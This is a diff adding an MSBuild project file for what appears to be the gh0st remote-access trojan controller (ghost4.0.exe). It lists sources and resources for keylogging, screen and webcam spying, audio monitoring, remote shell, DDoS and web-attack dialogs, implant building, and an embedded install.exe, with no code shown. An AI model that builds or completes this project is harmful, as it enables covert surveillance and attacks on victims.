@@ -1,0 +1,280 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Template|Win32">
+      <Configuration>Template</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <SccProjectName />
+    <SccLocalPath />
+    <Keyword>MFCProj</Keyword>
+    <ProjectGuid>{F783E0D4-34FE-413B-9DC9-5AFB59DD1308}</ProjectGuid>
+    <WindowsTargetPlatformVersion>10.0.22621.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Template|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <PlatformToolset>v140</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <PlatformToolset>v140</PlatformToolset>
+    <UseOfMfc>false</UseOfMfc>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Template|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.Cpp.UpgradeFromVC60.props" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <OutDir>.\Release\</OutDir>
+    <IntDir>.\Release\</IntDir>
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <StringPooling>true</StringPooling>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <Optimization>MaxSpeed</Optimization>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <IgnoreStandardIncludePath>false</IgnoreStandardIncludePath>
+      <AdditionalIncludeDirectories>CJ60lib/Include;../common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AssemblerListingLocation>.\Release\</AssemblerListingLocation>
+      <BrowseInformation>true</BrowseInformation>
+      <PrecompiledHeaderOutputFile>.\Release\gh0st.pch</PrecompiledHeaderOutputFile>
+      <ObjectFileName>.\Release\</ObjectFileName>
+      <ProgramDataBaseFileName>.\Release\</ProgramDataBaseFileName>
+      <MultiProcessorCompilation>false</MultiProcessorCompilation>
+      <CompileAsWinRT>false</CompileAsWinRT>
+    </ClCompile>
+    <Midl>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <TypeLibraryName>.\Release\gh0st.tlb</TypeLibraryName>
+      <MkTypLibCompatible>true</MkTypLibCompatible>
+      <TargetEnvironment>Win32</TargetEnvironment>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ResourceCompile>
+    <Bscmake>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <OutputFile>.\Release\gh0st.bsc</OutputFile>
+    </Bscmake>
+    <Link>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <IgnoreSpecificDefaultLibraries>msvcrt.lib;%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+      <OutputFile>../Bin/ghost4.0.exe</OutputFile>
+      <AdditionalLibraryDirectories>CJ60Lib/lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalDependencies>../common/zlib/zlib.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="..\common\Audio.cpp" />
+    <ClCompile Include="AudioDlg.cpp" />
+    <ClCompile Include="BatchCommand.cpp" />
+    <ClCompile Include="BmpToAvi.cpp" />
+    <ClCompile Include="BuildDialog.cpp" />
+    <ClCompile Include="BuildView.cpp" />
+    <ClCompile Include="ChatDialog.cpp" />
+    <ClCompile Include="CloseDlg.cpp" />
+    <ClCompile Include="CommuniqueDlg.cpp" />
+    <ClCompile Include="ConfigDlg.cpp" />
+    <ClCompile Include="control\BtnST.cpp" />
+    <ClCompile Include="control\HoverEdit.cpp" />
+    <ClCompile Include="control\WinXPButtonST.cpp" />
+    <ClCompile Include="CREDITSTATIC.CPP" />
+    <ClCompile Include="CustomTabCtrl.cpp" />
+    <ClCompile Include="DDOSAttackDlg.cpp" />
+    <ClCompile Include="Dib.cpp" />
+    <ClCompile Include="EventView.cpp" />
+    <ClCompile Include="FileManagerDlg.cpp" />
+    <ClCompile Include="FileTransferModeDlg.cpp" />
+    <ClCompile Include="FlowAttackDlg.cpp" />
+    <ClCompile Include="gh0st.cpp" />
+    <ClCompile Include="gh0stDoc.cpp" />
+    <ClCompile Include="gh0stView.cpp" />
+    <ClCompile Include="Icons.cpp" />
+    <ClCompile Include="include\Buffer.cpp" />
+    <ClCompile Include="include\CpuUsage.cpp" />
+    <ClCompile Include="include\IOCPServer.cpp" />
+    <ClCompile Include="IniFile.cpp" />
+    <ClCompile Include="InputDlg.cpp" />
+    <ClCompile Include="KeyBoardDlg.cpp" />
+    <ClCompile Include="LogonDialog.cpp" />
+    <ClCompile Include="MainFrm.cpp" />
+    <ClCompile Include="MD5.CPP" />
+    <ClCompile Include="MianZeShengMing.cpp" />
+    <ClCompile Include="MyToolsKit.cpp" />
+    <ClCompile Include="PluginDlg.cpp" />
+    <ClCompile Include="ScreenSpyDlg.cpp" />
+    <ClCompile Include="SettingsView.cpp" />
+    <ClCompile Include="SEU_QQwry.cpp" />
+    <ClCompile Include="ShellDlg.cpp" />
+    <ClCompile Include="Skin.cpp" />
+    <ClCompile Include="Splash.cpp" />
+    <ClCompile Include="StatLink.cpp" />
+    <ClCompile Include="StdAfx.cpp">
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
+      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">stdafx.h</PrecompiledHeaderFile>
+    </ClCompile>
+    <ClCompile Include="SystemDlg.cpp" />
+    <ClCompile Include="TabSDIFrameWnd.cpp" />
+    <ClCompile Include="TaskbarNotifier.cpp" />
+    <ClCompile Include="ThemeUtil.cpp" />
+    <ClCompile Include="TrayIcon.cpp" />
+    <ClCompile Include="TrueColorToolBar.cpp" />
+    <ClCompile Include="UpdateDlg.cpp" />
+    <ClCompile Include="User.cpp" />
+    <ClCompile Include="WebAttackDlg.cpp" />
+    <ClCompile Include="WebCamDlg.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="gh0st.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\common\macros.h" />
+    <ClInclude Include="AudioDlg.h" />
+    <ClInclude Include="BatchCommand.h" />
+    <ClInclude Include="BmpToAvi.h" />
+    <ClInclude Include="BuildDialog.h" />
+    <ClInclude Include="BuildView.h" />
+    <ClInclude Include="ChatDialog.h" />
+    <ClInclude Include="CloseDlg.h" />
+    <ClInclude Include="CommuniqueDlg.h" />
+    <ClInclude Include="ConfigDlg.h" />
+    <ClInclude Include="control\BtnST.h" />
+    <ClInclude Include="control\HoverEdit.h" />
+    <ClInclude Include="control\WinXPButtonST.h" />
+    <ClInclude Include="Creditstatic.h" />
+    <ClInclude Include="CustomTabCtrl.h" />
+    <ClInclude Include="DDOSAttackDlg.h" />
+    <ClInclude Include="Dib.h" />
+    <ClInclude Include="encode.h" />
+    <ClInclude Include="EventView.h" />
+    <ClInclude Include="FileManagerDlg.h" />
+    <ClInclude Include="FileTransferModeDlg.h" />
+    <ClInclude Include="FlowAttackDlg.h" />
+    <ClInclude Include="gh0st.h" />
+    <ClInclude Include="gh0stDoc.h" />
+    <ClInclude Include="gh0stView.h" />
+    <ClInclude Include="Icons.h" />
+    <ClInclude Include="include\Buffer.h" />
+    <ClInclude Include="include\IOCPServer.h" />
+    <ClInclude Include="include\List.h" />
+    <ClInclude Include="include\Queue.h" />
+    <ClInclude Include="include\_OrzEx\list.h" />
+    <ClInclude Include="include\_OrzEx\queue.h" />
+    <ClInclude Include="include\_OrzEx\syncobj.h" />
+    <ClInclude Include="IniFile.h" />
+    <ClInclude Include="KeyBoardDlg.h" />
+    <ClInclude Include="LogonDialog.h" />
+    <ClInclude Include="MainFrm.h" />
+    <ClInclude Include="MianZeShengMing.h" />
+    <ClInclude Include="MyToolsKit.h" />
+    <ClInclude Include="PluginDlg.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="ScreenSpyDlg.h" />
+    <ClInclude Include="SettingsView.h" />
+    <ClInclude Include="SEU_QQwry.h" />
+    <ClInclude Include="ShellDlg.h" />
+    <ClInclude Include="Skin.h" />
+    <ClInclude Include="Splash.h" />
+    <ClInclude Include="StatLink.h" />
+    <ClInclude Include="StdAfx.h" />
+    <ClInclude Include="SystemDlg.h" />
+    <ClInclude Include="TabSDIFrameWnd.h" />
+    <ClInclude Include="TaskbarNotifier.h" />
+    <ClInclude Include="ThemeUtil.h" />
+    <ClInclude Include="Tmschema.h" />
+    <ClInclude Include="TrayIcon.h" />
+    <ClInclude Include="TrueColorToolBar.h" />
+    <ClInclude Include="UpdateDlg.h" />
+    <ClInclude Include="User.h" />
+    <ClInclude Include="WebAttackDlg.h" />
+    <ClInclude Include="WebCamDlg.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <CustomBuild Include="GetRand.dll" />
+    <CustomBuild Include="res\1.cur" />
+    <CustomBuild Include="res\2.cur" />
+    <CustomBuild Include="res\3.cur" />
+    <CustomBuild Include="res\4.cur" />
+    <CustomBuild Include="res\default1.bin" />
+    <CustomBuild Include="res\dot.cur" />
+    <CustomBuild Include="res\gh0st.rc2" />
+    <CustomBuild Include="res\install.exe" />
+    <CustomBuild Include="res\lanse.she" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="res\102.ico" />
+    <Image Include="res\202.ico" />
+    <Image Include="res\audio.ico" />
+    <Image Include="res\Bitmap_4.bmp" />
+    <Image Include="res\Bitmap_5.bmp" />
+    <Image Include="res\cmdshell.ico" />
+    <Image Include="res\CS icon.ico" />
+    <Image Include="res\DDOS攻击.bmp" />
+    <Image Include="res\event.ico" />
+    <Image Include="res\gh0st.ico" />
+    <Image Include="res\keyboard.ico" />
+    <Image Include="res\Logo.bmp" />
+    <Image Include="res\Logo.gif" />
+    <Image Include="res\logon.bmp" />
+    <Image Include="res\search.ico" />
+    <Image Include="res\Seting.ICO" />
+    <Image Include="res\ShowInfo.bmp" />
+    <Image Include="res\system.ico" />
+    <Image Include="res\toolbar1.bmp" />
+    <Image Include="res\toolbar2.bmp" />
+    <Image Include="res\toolbar3.bmp" />
+    <Image Include="res\webcam.ico" />
+    <Image Include="res\使用工具.bmp" />
+    <Image Include="res\关于.bmp" />
+    <Image Include="res\屏幕监控.bmp" />
+    <Image Include="res\插件管理.ico" />
+    <Image Include="res\文件管理.bmp" />
+    <Image Include="res\更新.bmp" />
+    <Image Include="res\生成服务.bmp" />
+    <Image Include="res\用户反馈.bmp" />
+    <Image Include="res\筛选.bmp" />
+    <Image Include="res\系统管理.bmp" />
+    <Image Include="res\视频监控.bmp" />
+    <Image Include="res\语音监听.bmp" />
+    <Image Include="res\轻松换肤.bmp" />
+    <Image Include="res\远程CMD.bmp" />
+    <Image Include="res\退出程序.bmp" />
+    <Image Include="res\键盘监控.bmp" />
+    <Image Include="Splsh16.bmp" />
+  </ItemGroup>
+  <ItemGroup>
+    <Media Include="res\login.wav" />
+    <Media Include="res\offline.wav" />
+  </ItemGroup>
+  <ItemGroup>
+    <Text Include="ReadMe.txt" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
